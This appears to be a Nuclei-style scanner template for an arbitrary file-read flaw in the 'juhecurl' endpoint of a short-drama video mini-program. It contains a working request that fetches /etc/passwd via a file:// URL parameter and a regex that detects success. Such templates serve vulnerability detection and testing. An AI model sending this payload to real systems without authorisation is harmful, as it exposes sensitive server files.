id: djys-juhecurl-lfi

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 短剧影视小程序前台juhecurl任意文件读取漏洞
  reference:
    - https://mp.weixin.qq.com/s/3WYJzQnjl8hP7oXVZUEQuA
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/ems/juhecurl?url=file:///etc/passwd"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"